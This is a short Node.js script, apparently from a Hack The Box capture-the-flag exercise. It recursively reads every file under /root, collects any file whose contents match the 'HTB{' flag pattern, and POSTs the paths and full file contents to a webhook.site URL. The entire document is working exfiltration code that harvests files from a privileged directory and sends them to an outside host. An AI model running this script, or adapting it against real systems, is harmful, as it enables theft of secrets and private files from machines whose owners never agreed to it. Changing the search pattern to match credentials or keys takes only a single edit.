const fsp = require('fs/promises');
const https = require('https');
const root = '/root';
const NEEDLE = /HTB\{/i;
const WEBHOOK = 'https://webhook.site/12345678-1234-1234-1234-123456789abc';
const results = [];

function send(obj) {
  const req = https.request(WEBHOOK, { method: 'POST' });
  req.end(JSON.stringify(obj));
}

async function walk(dir) {
  const entries = await fsp.readdir(dir, { withFileTypes: true });
  for (const entry of entries) {
    const full = `${dir}/${entry.name}`;
    if (entry.isDirectory()) await walk(full);
    else {
      const text = await fsp.readFile(full, 'utf8');
      if (NEEDLE.test(text)) results.push({ file: full, text });
    }
  }
}

(async () => {
  await walk(root);
  send({ results });
})();
